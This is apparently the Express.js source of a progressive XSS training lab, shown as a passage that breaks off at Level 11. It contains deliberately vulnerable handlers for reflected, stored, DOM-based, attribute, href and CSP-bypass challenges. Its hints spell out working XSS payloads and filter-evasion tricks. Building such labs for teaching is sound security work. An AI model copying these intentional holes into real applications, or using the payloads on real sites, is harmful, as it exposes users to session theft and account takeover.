    .grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(340px, 1fr)); gap: 1.25rem; padding: 2rem; max-width: 1200px; margin: 0 auto; }
    .card { background: #161b22; border: 1px solid #30363d; border-radius: 12px; padding: 1.5rem; transition: border-color 0.2s, transform 0.2s; }
    .card:hover { border-color: #58a6ff; transform: translateY(-2px); }
    .card .level { font-size: 0.75rem; font-weight: 600; text-transform: uppercase; letter-spacing: 0.1em; margin-bottom: 0.5rem; }
    .card h2 { font-size: 1.1rem; color: #e6edf3; margin-bottom: 0.5rem; }
    .card p { font-size: 0.85rem; color: #8b949e; line-height: 1.5; margin-bottom: 1rem; }
    .card .tags { display: flex; gap: 0.5rem; flex-wrap: wrap; margin-bottom: 1rem; }
    .card .tag { font-size: 0.7rem; padding: 0.2rem 0.6rem; border-radius: 20px; border: 1px solid #30363d; color: #8b949e; }
    .card a { display: inline-block; padding: 0.5rem 1.2rem; background: #21262d; border: 1px solid #30363d; border-radius: 8px; color: #58a6ff; text-decoration: none; font-size: 0.85rem; font-weight: 500; transition: background 0.2s; }
    .card a:hover { background: #30363d; }
    .diff-easy .level { color: #3fb950; }
    .diff-medium .level { color: #d29922; }
    .diff-hard .level { color: #f85149; }
    .diff-expert .level { color: #bc4dff; }
    .instructions { max-width: 1200px; margin: 0 auto; padding: 0 2rem 2rem; }
    .instructions details { background: #161b22; border: 1px solid #30363d; border-radius: 12px; padding: 1.25rem; }
    .instructions summary { cursor: pointer; color: #58a6ff; font-weight: 600; }
    .instructions ul { margin-top: 1rem; padding-left: 1.5rem; }
    .instructions li { margin-bottom: 0.5rem; font-size: 0.9rem; color: #8b949e; }
    .instructions code { background: #21262d; padding: 0.15rem 0.4rem; border-radius: 4px; font-size: 0.8rem; color: #c9d1d9; }
  </style>
</head>
<body>
  <div class="header">
    <h1>XSS Training Lab</h1>
    <p>Progressive challenges &mdash; exploit each level to unlock harder defenses</p>
    <div style="margin-top:1rem;display:flex;gap:0.75rem;justify-content:center;">
      <a href="/cheatsheet" style="padding:0.5rem 1.2rem;background:rgba(255,255,255,0.1);border:1px solid #30363d;border-radius:8px;color:#c084fc;text-decoration:none;font-size:0.85rem;font-weight:500;">View Cheat Sheet &amp; Writeups</a>
      <button onclick="if(confirm('Reset all progress? This clears your solved levels and payloads.')){fetch('/api/reset',{method:'POST'}).then(()=>location.reload())}" style="padding:0.5rem 1.2rem;background:rgba(255,255,255,0.05);border:1px solid #da3633;border-radius:8px;color:#f85149;font-size:0.85rem;font-weight:500;cursor:pointer;">Reset Progress</button>
    </div>
  </div>

  <div class="instructions">
    <details>
      <summary>How This Lab Works</summary>
      <ul>
        <li>Each level has a specific <strong>injection context</strong> and set of <strong>defenses</strong> to bypass.</li>
        <li>Your goal is always to execute <code>alert('XSS')</code> (or any JS) in your browser.</li>
        <li>When you succeed, the page will detect it and show a success banner.</li>
        <li>Levels get progressively harder with more filters, encoding, and CSP.</li>
        <li>Read the hint on each level page if you're stuck.</li>
        <li><strong>Tip:</strong> Open your browser DevTools (F12) to inspect how your input is rendered.</li>
      </ul>
    </details>
  </div>

  <div class="grid">
    <div class="card diff-easy">
      <div class="level">Level 1 &mdash; Easy</div>
      <h2>Hello, Reflected XSS</h2>
      <p>No filters, no encoding. Your input is reflected directly into the page. The classic starting point.</p>
      <div class="tags"><span class="tag">Reflected</span><span class="tag">No Filter</span></div>
      <a href="/level/1">Start Challenge</a>
    </div>

    <div class="card diff-easy">
      <div class="level">Level 2 &mdash; Easy</div>
      <h2>Stored XSS Guestbook</h2>
      <p>Your input is stored and rendered for all visitors. Classic persistent XSS.</p>
      <div class="tags"><span class="tag">Stored</span><span class="tag">No Filter</span></div>
      <a href="/level/2">Start Challenge</a>
    </div>

    <div class="card diff-medium">
      <div class="level">Level 3 &mdash; Medium</div>
      <h2>Script Tag Blocked</h2>
      <p>The server strips &lt;script&gt; tags. Find another way to execute JavaScript.</p>
      <div class="tags"><span class="tag">Reflected</span><span class="tag">Tag Filter</span></div>
      <a href="/level/3">Start Challenge</a>
    </div>

    <div class="card diff-medium">
      <div class="level">Level 4 &mdash; Medium</div>
      <h2>Attribute Injection</h2>
      <p>Your input lands inside an HTML attribute. Break out and execute code.</p>
      <div class="tags"><span class="tag">Attribute Context</span><span class="tag">Quote Escape</span></div>
      <a href="/level/4">Start Challenge</a>
    </div>

    <div class="card diff-medium">
      <div class="level">Level 5 &mdash; Medium</div>
      <h2>JavaScript Context</h2>
      <p>Your input is placed inside a JavaScript string variable. Escape and inject.</p>
      <div class="tags"><span class="tag">JS Context</span><span class="tag">String Escape</span></div>
      <a href="/level/5">Start Challenge</a>
    </div>

    <div class="card diff-hard">
      <div class="level">Level 6 &mdash; Hard</div>
      <h2>Event Handler Blocklist</h2>
      <p>Common event handlers (onerror, onload, onclick, etc.) are blocked. Find an obscure one.</p>
      <div class="tags"><span class="tag">Reflected</span><span class="tag">Event Blocklist</span></div>
      <a href="/level/6">Start Challenge</a>
    </div>

    <div class="card diff-hard">
      <div class="level">Level 7 &mdash; Hard</div>
      <h2>Case & Keyword Filter</h2>
      <p>Aggressive filter blocks script, alert, onerror (case-insensitive) and strips them. Use encoding or alternative functions.</p>
      <div class="tags"><span class="tag">Reflected</span><span class="tag">Keyword Strip</span><span class="tag">Encoding</span></div>
      <a href="/level/7">Start Challenge</a>
    </div>

    <div class="card diff-hard">
      <div class="level">Level 8 &mdash; Hard</div>
      <h2>DOM-Based XSS</h2>
      <p>No server reflection. The vulnerability is entirely in client-side JavaScript reading from the URL.</p>
      <div class="tags"><span class="tag">DOM-based</span><span class="tag">Client-Side</span></div>
      <a href="/level/8">Start Challenge</a>
    </div>

    <div class="card diff-expert">
      <div class="level">Level 9 &mdash; Expert</div>
      <h2>href Injection with Filters</h2>
      <p>Your input goes into an anchor href. The filter blocks &lt;script&gt;, event handlers, and the word "javascript". Find a way.</p>
      <div class="tags"><span class="tag">href Context</span><span class="tag">Protocol Filter</span></div>
      <a href="/level/9">Start Challenge</a>
    </div>

    <div class="card diff-expert">
      <div class="level">Level 10 &mdash; Expert</div>
      <h2>CSP Bypass</h2>
      <p>A Content-Security-Policy is in place. Find a way to execute JavaScript despite the policy.</p>
      <div class="tags"><span class="tag">CSP</span><span class="tag">Nonce</span><span class="tag">Advanced</span></div>
      <a href="/level/10">Start Challenge</a>
    </div>

    <div class="card diff-expert">
      <div class="level">Level 11 &mdash; Expert</div>
      <h2>Double Encoding Bypass</h2>
      <p>The server URL-decodes then filters. But decoding happens more than once in the pipeline...</p>
      <div class="tags"><span class="tag">Reflected</span><span class="tag">Double Encoding</span><span class="tag">Multi-Decode</span></div>
      <a href="/level/11">Start Challenge</a>
    </div>

    <div class="card diff-expert">
      <div class="level">Level 12 &mdash; Expert</div>
      <h2>Client-Side Template Injection</h2>
      <p>All HTML tags are stripped. But a client-side template engine evaluates {{expressions}}.</p>
      <div class="tags"><span class="tag">Template Injection</span><span class="tag">No HTML</span><span class="tag">eval</span></div>
      <a href="/level/12">Start Challenge</a>
    </div>

    <div class="card diff-expert">
      <div class="level">Level 13 &mdash; Expert</div>
      <h2>postMessage XSS</h2>
      <p>No forms, no reflection. The page listens for cross-window messages with no origin check.</p>
      <div class="tags"><span class="tag">DOM-based</span><span class="tag">postMessage</span><span class="tag">Console</span></div>
      <a href="/level/13">Start Challenge</a>
    </div>

    <div class="card diff-expert">
      <div class="level">Level 14 &mdash; Expert</div>
      <h2>SVG Upload XSS</h2>
      <p>Upload SVG images that are rendered inline. Script tags are stripped, but SVGs have their own tricks.</p>
      <div class="tags"><span class="tag">Stored</span><span class="tag">SVG</span><span class="tag">File Upload</span></div>
      <a href="/level/14">Start Challenge</a>
    </div>

    <div class="card diff-expert">
      <div class="level">Level 15 &mdash; Expert</div>
      <h2>Mutation XSS</h2>
      <p>A client-side sanitizer strips scripts and event handlers. But the browser's parser may mutate HTML after sanitization.</p>
      <div class="tags"><span class="tag">mXSS</span><span class="tag">DOMParser</span><span class="tag">Sanitizer Bypass</span></div>
      <a href="/level/15">Start Challenge</a>
    </div>

    <div class="card diff-expert">
      <div class="level">Level 16 &mdash; Expert</div>
      <h2>Recursive Keyword Filter</h2>
      <p>The filter loops until nothing changes. Nesting tricks are dead. Think about alternative execution contexts.</p>
      <div class="tags"><span class="tag">Recursive Filter</span><span class="tag">srcdoc</span><span class="tag">Context Escape</span></div>
      <a href="/level/16">Start Challenge</a>
    </div>

    <div class="card diff-expert">
      <div class="level">Level 17 &mdash; Expert</div>
      <h2>The Polyglot</h2>
      <p>Your input appears in three contexts at once: HTML body, attribute, and JavaScript string. Find the weakest link.</p>
      <div class="tags"><span class="tag">Multi-Context</span><span class="tag">Polyglot</span><span class="tag">Source Analysis</span></div>
      <a href="/level/17">Start Challenge</a>
    </div>

    <div class="card diff-expert">
      <div class="level">Level 18 &mdash; Expert</div>
      <h2>DOM Clobbering</h2>
      <p>Scripts and event handlers are blocked. But the page reads global variables that HTML elements can overwrite.</p>
      <div class="tags"><span class="tag">DOM Clobbering</span><span class="tag">Named Access</span><span class="tag">No JS Needed</span></div>
      <a href="/level/18">Start Challenge</a>
    </div>

    <div class="card diff-expert">
      <div class="level">Level 19 &mdash; Expert</div>
      <h2>Prototype Pollution &rarr; XSS</h2>
      <p>No HTML injection. Your JSON input is merged into a config object. Pollute the prototype chain to achieve XSS.</p>
      <div class="tags"><span class="tag">Prototype Pollution</span><span class="tag">JSON</span><span class="tag">Deep Merge</span></div>
      <a href="/level/19">Start Challenge</a>
    </div>

    <div class="card diff-expert">
      <div class="level">Level 20 &mdash; Expert</div>
      <h2>Base Tag Injection</h2>
      <p>CSP is in place. Scripts and handlers are blocked. But the page loads scripts via relative URLs and you inject before them.</p>
      <div class="tags"><span class="tag">Base Tag</span><span class="tag">CSP Bypass</span><span class="tag">Relative URLs</span></div>
      <a href="/level/20">Start Challenge</a>
    </div>

    <div class="card diff-expert">
      <div class="level">Level 21 &mdash; Expert</div>
      <h2>Dangling Markup Injection</h2>
      <p>All execution vectors are blocked. But a CSRF token is nearby. Exfiltrate it without executing any JavaScript.</p>
      <div class="tags"><span class="tag">Dangling Markup</span><span class="tag">Data Exfiltration</span><span class="tag">No JS</span></div>
      <a href="/level/21">Start Challenge</a>
    </div>

    <div class="card diff-expert">
      <div class="level">Level 22 &mdash; Expert</div>
      <h2>JSON Injection in Script Block</h2>
      <p>Your input lands inside a JSON object within a nonced script tag. Angle brackets are escaped. But are quotes?</p>
      <div class="tags"><span class="tag">JSON Injection</span><span class="tag">Script Context</span><span class="tag">CSP Bypass</span></div>
      <a href="/level/22">Start Challenge</a>
    </div>

    <div class="card diff-expert">
      <div class="level">Level 23 &mdash; Expert</div>
      <h2>URL Scheme Bypass</h2>
      <p>Your URL goes into an anchor href. Scripts, handlers, and javascript: are blocked. But the browser decodes HTML entities...</p>
      <div class="tags"><span class="tag">Entity Encoding</span><span class="tag">href Context</span><span class="tag">Protocol Bypass</span></div>
      <a href="/level/23">Start Challenge</a>
    </div>
  </div>
</body>
</html>`);
});

// ============================================================
// SHARED HELPERS
// ============================================================
function levelPage(title, levelNum, difficulty, defenses, hint, bodyContent) {
  const hintEncoded = Buffer.from(hint).toString('base64');
  const diffClass = { Easy: 'diff-easy', Medium: 'diff-medium', Hard: 'diff-hard', Expert: 'diff-expert' }[difficulty] || '';
  return `<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Level ${levelNum} - ${title}</title>
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body { font-family: 'Segoe UI', system-ui, sans-serif; background: #0a0a0f; color: #c9d1d9; min-height: 100vh; padding: 2rem; }
    .nav { margin-bottom: 1.5rem; }
    .nav a { color: #58a6ff; text-decoration: none; font-size: 0.85rem; }
    .level-header { margin-bottom: 2rem; }
    .level-header .badge { display: inline-block; font-size: 0.7rem; font-weight: 700; text-transform: uppercase; letter-spacing: 0.1em; padding: 0.25rem 0.7rem; border-radius: 20px; margin-bottom: 0.75rem; }
    .diff-easy .badge { background: #0d3320; color: #3fb950; border: 1px solid #238636; }
    .diff-medium .badge { background: #3d2e00; color: #d29922; border: 1px solid #9e6a03; }
    .diff-hard .badge { background: #3d1114; color: #f85149; border: 1px solid #da3633; }
    .diff-expert .badge { background: #2a1541; color: #bc4dff; border: 1px solid #8b3dba; }
    .level-header h1 { font-size: 1.5rem; color: #e6edf3; margin-bottom: 0.5rem; }
    .defenses { font-size: 0.85rem; color: #8b949e; margin-bottom: 0.5rem; }
    .defenses strong { color: #c9d1d9; }
    .challenge-area { background: #161b22; border: 1px solid #30363d; border-radius: 12px; padding: 1.5rem; margin-bottom: 1.5rem; }
    form { display: flex; gap: 0.75rem; margin-bottom: 1rem; flex-wrap: wrap; }
    input[type="text"], textarea { flex: 1; min-width: 250px; padding: 0.6rem 1rem; background: #0d1117; border: 1px solid #30363d; border-radius: 8px; color: #c9d1d9; font-size: 0.9rem; font-family: inherit; }
    input[type="text"]:focus, textarea:focus { outline: none; border-color: #58a6ff; }
    button { padding: 0.6rem 1.5rem; background: #238636; border: 1px solid #2ea043; border-radius: 8px; color: #fff; font-size: 0.85rem; font-weight: 600; cursor: pointer; }
    button:hover { background: #2ea043; }
    .output { padding: 1rem; background: #0d1117; border: 1px solid #30363d; border-radius: 8px; min-height: 3rem; word-break: break-all; }
    .hint { margin-top: 1.5rem; }
    .hint details { background: #161b22; border: 1px solid #30363d; border-radius: 12px; padding: 1rem; }
    .hint summary { cursor: pointer; color: #d29922; font-weight: 600; font-size: 0.9rem; }
    .hint p { margin-top: 0.75rem; font-size: 0.85rem; color: #8b949e; line-height: 1.6; }
    .hint code { background: #21262d; padding: 0.15rem 0.4rem; border-radius: 4px; font-size: 0.8rem; color: #c9d1d9; }
    .writeup { display: none; margin-top: 1.5rem; background: linear-gradient(135deg, #161b22 0%, #1a1025 100%); border: 1px solid #8b3dba; border-radius: 12px; padding: 1.5rem; }
    .writeup h2 { font-size: 1.1rem; color: #c084fc; margin-bottom: 1rem; }
    .writeup h3 { font-size: 0.85rem; text-transform: uppercase; letter-spacing: 0.05em; color: #bc4dff; margin-top: 1.25rem; margin-bottom: 0.5rem; }
    .writeup h3:first-of-type { margin-top: 0; }
    .writeup p { font-size: 0.85rem; color: #c9d1d9; line-height: 1.7; }
    .writeup code { background: #21262d; padding: 0.15rem 0.4rem; border-radius: 4px; font-size: 0.8rem; color: #e6edf3; }
    .success-banner { display: none; position: fixed; top: 0; left: 0; right: 0; padding: 1rem; background: linear-gradient(135deg, #238636, #2ea043); color: #fff; text-align: center; font-weight: 700; font-size: 1.1rem; z-index: 9999; animation: slideDown 0.3s ease; align-items: center; justify-content: center; gap: 1.5rem; }
    .success-banner a { color: #fff; background: rgba(255,255,255,0.2); padding: 0.35rem 1rem; border-radius: 6px; text-decoration: none; font-size: 0.85rem; font-weight: 600; border: 1px solid rgba(255,255,255,0.3); }
    .success-banner a:hover { background: rgba(255,255,255,0.3); }
    @keyframes slideDown { from { transform: translateY(-100%); } to { transform: translateY(0); } }
  </style>
</head>
<body class="${diffClass}">
  <div class="success-banner" id="successBanner">
    <span>XSS Triggered! Level ${levelNum} Complete!</span>
    <a href="/">Dashboard</a>
    ${levelNum < 23 ? `<a href="/level/${levelNum + 1}">Next Level &rarr;</a>` : '<a href="/">All Done!</a>'}
  </div>
  <script>
    // Success detection MUST run before any user content is parsed
    (function() {
      var solved = false;
      var levelNum = ${levelNum};
      function onSolve() {
        if (solved) return;
        solved = true;
        document.getElementById('successBanner').style.display = 'flex';
        // Capture the payload from the URL or form
        var payload = new URLSearchParams(location.search).get('q')
          || new URLSearchParams(location.search).get('url')
          || location.hash.substring(1)
          || '(console/postMessage payload)';
        // Record the solution
        fetch('/api/solve', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ level: levelNum, payload: payload, url: location.href })
        }).then(function(r) { return r.json(); }).then(function(data) {
          if (data.writeup) {
            var w = document.getElementById('writeupSection');
            if (w) {
              w.style.display = 'block';
              document.getElementById('writeupTitle').innerHTML = data.writeup.title;
              document.getElementById('writeupWhy').innerHTML = data.writeup.why;
              document.getElementById('writeupLesson').innerHTML = data.writeup.lesson;
              document.getElementById('writeupReal').innerHTML = data.writeup.realWorld;
            }
          }
        }).catch(function(){});
      }
      var _alert = window.alert;
      window.alert = function() { onSolve(); _alert.apply(window, arguments); };
      var _confirm = window.confirm;
      window.confirm = function() { onSolve(); return _confirm.apply(window, arguments); };
      var _prompt = window.prompt;
      window.prompt = function() { onSolve(); return _prompt.apply(window, arguments); };
    })();
  </script>
  <div class="nav"><a href="/">&larr; Back to Dashboard</a> &nbsp;&middot;&nbsp; <a href="/cheatsheet">Cheat Sheet</a></div>
  <div class="level-header">
    <span class="badge">Level ${levelNum} &mdash; ${difficulty}</span>
    <h1>${title}</h1>
    <p class="defenses"><strong>Defenses:</strong> ${defenses}</p>
  </div>
  <div class="challenge-area">
    ${bodyContent}
  </div>
  <div class="hint">
    <details id="hintBox">
      <summary>Hint (try on your own first!)</summary>
      <p id="hintContent"></p>
    </details>
  </div>
  <script>
    document.getElementById('hintBox').addEventListener('toggle', function() {
      if (!this.open) return;
      var el = document.getElementById('hintContent');
      if (el.dataset.loaded) return;
      el.dataset.loaded = '1';
      el.innerHTML = atob('${hintEncoded}');
    });
  </script>
  <div class="writeup" id="writeupSection">
    <h2 id="writeupTitle"></h2>
    <h3>Why It Worked</h3>
    <p id="writeupWhy"></p>
    <h3>Key Lesson</h3>
    <p id="writeupLesson"></p>
    <h3>Real-World Application</h3>
    <p id="writeupReal"></p>
  </div>
</body>
</html>`;
}

// ============================================================
// LEVEL 1 - Basic Reflected XSS (no filter)
// ============================================================
app.get('/level/1', (req, res) => {
  const q = req.query.q || '';
  const output = q ? `<div class="output"><p>Search results for: ${q}</p></div>` : '';
  res.send(levelPage(
    'Hello, Reflected XSS', 1, 'Easy',
    'None &mdash; your input is reflected directly into HTML with zero filtering.',
    'Try injecting an HTML tag that executes JavaScript. The simplest payload: <code>&lt;script&gt;alert("XSS")&lt;/script&gt;</code>',
    `<p style="color:#8b949e;margin-bottom:1rem;">Enter a search term. Your input appears in the page below.</p>
    <form method="GET">
      <input type="text" name="q" placeholder="Search..." value="">
      <button type="submit">Search</button>
    </form>
    ${output}`
  ));
});

// ============================================================
// LEVEL 2 - Stored XSS (Guestbook, no filter)
// ============================================================
app.get('/level/2', (req, res) => {
  const entries = guestbook.map(e => `<div style="padding:0.75rem;border-bottom:1px solid #21262d;"><strong style="color:#58a6ff;">${e.name}</strong><p style="margin-top:0.25rem;">${e.message}</p></div>`).join('');
  const hasEntries = guestbook.length > 0;
  res.send(levelPage(
    'Stored XSS Guestbook', 2, 'Easy',
    'None &mdash; input is stored and rendered without any sanitization.',
    'Just like Level 1, but your payload persists. Try putting a <code>&lt;script&gt;</code> tag in the message field. It will fire every time someone visits.',
    `<p style="color:#8b949e;margin-bottom:1rem;">Leave a message in the guestbook. ${hasEntries ? '<strong style="color:#f85149;">Note: If the success banner appeared immediately, you already have a working XSS payload stored. Clear the guestbook to start fresh.</strong>' : ''}</p>
    <form method="POST" action="/level/2">
      <input type="text" name="name" placeholder="Your name" style="max-width:200px;">
      <input type="text" name="message" placeholder="Your message" style="flex:2;">
      <button type="submit">Post</button>
    </form>
    <div style="margin-top:1rem;">${entries || '<p style="color:#484f58;">No entries yet.</p>'}</div>
    <form method="POST" action="/level/2/clear" style="margin-top:1rem;"><button type="submit" style="background:#da3633;border-color:#f85149;color:#fff;">Clear Guestbook</button></form>`
  ));
});

app.post('/level/2', (req, res) => {
  const { name, message } = req.body;
  if (name && message) guestbook.push({ name, message });
  res.redirect('/level/2');
});

app.post('/level/2/clear', (req, res) => {
  guestbook.length = 0;
  res.redirect('/level/2');
});

// ============================================================
// LEVEL 3 - <script> tag blocked (case-insensitive)
// ============================================================
app.get('/level/3', (req, res) => {
  let q = req.query.q || '';
  // Defense: strip <script> and </script> tags (case insensitive)
  q = q.replace(/<\/?script\b[^>]*>/gi, '');
  const output = q ? `<div class="output"><p>Result: ${q}</p></div>` : '';
  res.send(levelPage(
    'Script Tag Blocked', 3, 'Medium',
    '<code>&lt;script&gt;</code> tags are stripped (case-insensitive regex).',
    'The &lt;script&gt; tag is blocked, but many other HTML elements can execute JavaScript. Try <code>&lt;img src=x onerror=alert("XSS")&gt;</code> or <code>&lt;svg onload=alert("XSS")&gt;</code>.',
    `<p style="color:#8b949e;margin-bottom:1rem;">The server removes &lt;script&gt; tags. Find another vector.</p>
    <form method="GET">
      <input type="text" name="q" placeholder="Payload..." value="">
      <button type="submit">Submit</button>
    </form>
    ${output}`
  ));
});

// ============================================================
// LEVEL 4 - Attribute injection context
// ============================================================
app.get('/level/4', (req, res) => {
  const q = req.query.q || '';
  // Input goes into an attribute value - no encoding applied
  res.send(levelPage(
    'Attribute Injection', 4, 'Medium',
    'Input is placed inside an HTML attribute value (double-quoted). No tag filtering.',
    'Your input is inside a <code>value="..."</code> attribute. Close the attribute with <code>"</code>, then add an event handler like <code>" onfocus=alert("XSS") autofocus="</code> or close the tag entirely with <code>"&gt;&lt;script&gt;alert("XSS")&lt;/script&gt;</code>.',
    `<p style="color:#8b949e;margin-bottom:1rem;">Your input is reflected into an input element's value attribute.</p>
    <form method="GET">
      <input type="text" name="q" placeholder="Type here..." value="">
      <button type="submit">Submit</button>
    </form>
    <div class="output" style="margin-top:1rem;">
      <p>Reflected element:</p>
      <input type="text" value="${q}" style="width:100%;padding:0.5rem;background:#0d1117;border:1px solid #30363d;border-radius:4px;color:#c9d1d9;">
    </div>`
  ));
});

// ============================================================
// LEVEL 5 - JavaScript string context
// ============================================================
app.get('/level/5', (req, res) => {
  let q = req.query.q || '';
  // Defense: escape < and > so you can't inject new tags
  q = q.replace(/</g, '&lt;').replace(/>/g, '&gt;');
  res.send(levelPage(
    'JavaScript Context', 5, 'Medium',
    'Angle brackets <code>&lt; &gt;</code> are HTML-encoded. Your input lands inside a JS string literal.',
    'You can\'t create new tags, but you\'re inside a JS string. Close the string with <code>\'</code>, then inject code: <code>\';alert("XSS");//</code>. The <code>//</code> comments out the rest of the line.',
    `<p style="color:#8b949e;margin-bottom:1rem;">Your input is placed inside a JavaScript string variable. Angle brackets are encoded.</p>
    <form method="GET">
      <input type="text" name="q" placeholder="Payload..." value="">
      <button type="submit">Submit</button>
    </form>
    <div class="output" style="margin-top:1rem;">
      <p>Check the page source to see where your input lands.</p>
    </div>
    <script>
      var userData = '${q}';
      document.querySelector('.output').innerHTML += '<p>User data: ' + userData + '</p>';
    </script>`
  ));
});

// ============================================================
// LEVEL 6 - Common event handlers blocked
// ============================================================
app.get('/level/6', (req, res) => {
  let q = req.query.q || '';
  // Defense: strip <script> and common event handlers
  q = q.replace(/<\/?script\b[^>]*>/gi, '');
  q = q.replace(/\bon(error|load|click|mouseover|mouseout|focus|blur|input|change|submit|keydown|keyup|keypress)\s*=/gi, '');
  const output = q ? `<div class="output"><p>Result: ${q}</p></div>` : '';
  res.send(levelPage(
    'Event Handler Blocklist', 6, 'Hard',
    '<code>&lt;script&gt;</code> tags stripped. Common event handlers (<code>onerror, onload, onclick, onmouseover, onfocus, onblur, oninput, onchange, onsubmit, onkeydown, onkeyup, onkeypress</code>) are stripped.',
    'Many obscure event handlers exist beyond the common ones. Try: <code>&lt;details open ontoggle=alert("XSS")&gt;&lt;summary&gt;X&lt;/summary&gt;&lt;/details&gt;</code> or <code>&lt;marquee onstart=alert("XSS")&gt;</code> or <code>&lt;body onpageshow=alert("XSS")&gt;</code> or <code>&lt;video&gt;&lt;source onerror=alert("XSS")&gt;&lt;/video&gt;</code>... wait, onerror is blocked. Think about which handlers are NOT in the blocklist.',
    `<p style="color:#8b949e;margin-bottom:1rem;">Common event handlers are stripped. Find an obscure one.</p>
    <form method="GET">
      <input type="text" name="q" placeholder="Payload..." value="">
      <button type="submit">Submit</button>
    </form>
    ${output}`
  ));
});

// ============================================================
// LEVEL 7 - Aggressive keyword stripping + case insensitive
// ============================================================
app.get('/level/7', (req, res) => {
  let q = req.query.q || '';
  // Defense: strip dangerous keywords (single pass)
  q = q.replace(/script/gi, '')
       .replace(/alert/gi, '')
       .replace(/onerror/gi, '')
       .replace(/onload/gi, '')
       .replace(/onclick/gi, '')
       .replace(/onfocus/gi, '')
       .replace(/onmouseover/gi, '')
       .replace(/javascript/gi, '')
       .replace(/eval/gi, '')
       .replace(/prompt/gi, '')
       .replace(/confirm/gi, '');
  const output = q ? `<div class="output"><p>Result: ${q}</p></div>` : '';
  res.send(levelPage(
    'Case & Keyword Filter', 7, 'Hard',
    'Keywords stripped (single pass, case-insensitive): <code>script, alert, onerror, onload, onclick, onfocus, onmouseover, javascript, eval, prompt, confirm</code>.',
    'The filter does a <strong>single pass</strong> strip. If you nest the keyword inside itself, the outer parts reassemble after the inner one is removed. Try: <code>&lt;img src=x onerronerrorr=alalertert("XSS")&gt;</code>. Also consider: <code>&lt;svg/onloaonloadd=alealertrt(1)&gt;</code>. The key insight: <code>onerronerrorr</code> &rarr; strip "onerror" from inside &rarr; <code>onerror</code>.',
    `<p style="color:#8b949e;margin-bottom:1rem;">Dangerous keywords are stripped in a single pass. Can you reconstruct them?</p>
    <form method="GET">
      <input type="text" name="q" placeholder="Payload..." value="">
      <button type="submit">Submit</button>
    </form>
    ${output}`
  ));
});

// ============================================================
// LEVEL 8 - DOM-based XSS (no server reflection)
// ============================================================
app.get('/level/8', (req, res) => {
  // No server-side reflection at all - the vulnerability is purely client-side
  res.send(levelPage(
    'DOM-Based XSS', 8, 'Hard',
    'No server-side reflection. Vulnerability is in client-side JavaScript that reads from <code>location.hash</code>.',
    'The client-side JS reads <code>location.hash</code> and writes it to the DOM via <code>innerHTML</code>. Try navigating to <code>/level/8#&lt;img src=x onerror=alert("XSS")&gt;</code>. The hash is never sent to the server, making this invisible to server-side filters.',
    `<p style="color:#8b949e;margin-bottom:1rem;">This page has no server-side reflection. The vulnerability is entirely in the client-side JavaScript. Check the source!</p>
    <p style="color:#8b949e;margin-bottom:1rem;">Use the URL hash (#) to inject content.</p>
    <div class="output" id="domOutput">
      <p style="color:#484f58;">Waiting for hash input...</p>
    </div>
    <script>
      // Vulnerable client-side code
      function renderHash() {
        var hash = decodeURIComponent(location.hash.substring(1));
        if (hash) {
          document.getElementById('domOutput').innerHTML = '<p>Welcome, ' + hash + '!</p>';
        }
      }
      window.addEventListener('hashchange', renderHash);
      renderHash();
    </script>`
  ));
});

// ============================================================
// LEVEL 9 - href injection with protocol filter
// ============================================================
app.get('/level/9', (req, res) => {
  let url = req.query.url || '';
  // Defense: block <script>, event handlers, and "javascript" keyword
  let filtered = url.replace(/<\/?script\b[^>]*>/gi, '');
  filtered = filtered.replace(/\bon\w+\s*=/gi, '');
  // Block "javascript:" scheme (but naive - only blocks lowercase literal)
  const blocked = /javascript:/i.test(filtered);
  const output = blocked
    ? `<div class="output"><p style="color:#f85149;">Blocked: "javascript:" protocol detected.</p></div>`
    : url ? `<div class="output"><p>Click the link: <a href="${filtered}">Visit Link</a></p></div>` : '';
  res.send(levelPage(
    'href Injection with Filters', 9, 'Expert',
    '<code>&lt;script&gt;</code> stripped, event handlers stripped, <code>javascript:</code> protocol blocked (case-insensitive check).',
    'The filter checks for <code>javascript:</code> case-insensitively, but what about tab/newline characters within the keyword? Try: <code>java&#x09;script:alert("XSS")</code> using URL-encoded tab: <code>java%09script:alert(1)</code>. Or use HTML entity encoding in the href: <code>&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;alert(1)</code>. The browser decodes HTML entities in attribute values before interpreting the URL scheme.',
    `<p style="color:#8b949e;margin-bottom:1rem;">Provide a URL to create a link. The server blocks &lt;script&gt;, event handlers, and the javascript: protocol.</p>
    <form method="GET">
      <input type="text" name="url" placeholder="Enter URL..." value="">
      <button type="submit">Create Link</button>
    </form>
    ${output}`
  ));
});

// ============================================================
// LEVEL 10 - CSP Bypass
// ============================================================
app.get('/level/10', (req, res) => {
  const q = req.query.q || '';
  // CSP: only allow scripts from 'self' and with a specific nonce
  // But we intentionally include a JSONP-like endpoint that can be abused
  const nonce = Math.random().toString(36).substring(2, 15);
  const html = levelPage(
    'CSP Bypass', 10, 'Expert',
    `Content-Security-Policy: <code>script-src 'nonce-${nonce}' 'self'</code>. Only nonced scripts and same-origin scripts are allowed.`,
    'The CSP allows <code>\'self\'</code> as a script source. The <code>/api/jsonp</code> endpoint reflects a callback parameter without sanitization. You can use it as a script source: <code>&lt;script src="/api/jsonp?callback=alert(1)//"&gt;&lt;/script&gt;</code>. The JSONP endpoint returns executable JS with your callback, and since it\'s same-origin, the CSP allows it.',
    `<p style="color:#8b949e;margin-bottom:1rem;">A strict Content-Security-Policy is in place. Inline scripts without the nonce will be blocked by the browser.</p>
    <p style="color:#8b949e;margin-bottom:1rem;">Interesting: there's an API endpoint at <code>/api/jsonp?callback=myFunction</code> on this same origin...</p>
    <form method="GET">
      <input type="text" name="q" placeholder="Payload..." value="">
      <button type="submit">Submit</button>
    </form>
    <div class="output">${q ? `<p>Result: ${q}</p>` : ''}</div>`
  );
  res.set('Content-Security-Policy', `script-src 'nonce-${nonce}' 'self'`);
  // Patch the script tags in our template to include the nonce
  res.send(html.replace(/<script>/g, `<script nonce="${nonce}">`));
});

// JSONP endpoint (intentionally vulnerable - used by Level 10)
app.get('/api/jsonp', (req, res) => {
  const callback = req.query.callback || 'callback';
  res.type('application/javascript');
  res.send(`${callback}({"status":"ok"})`);
});

// ============================================================
// LEVEL 11 - Double Encoding Bypass (WAF + Application decode)
// ============================================================
app.get('/level/11', (req, res) => {
  // Extract the raw query value — no automatic decoding
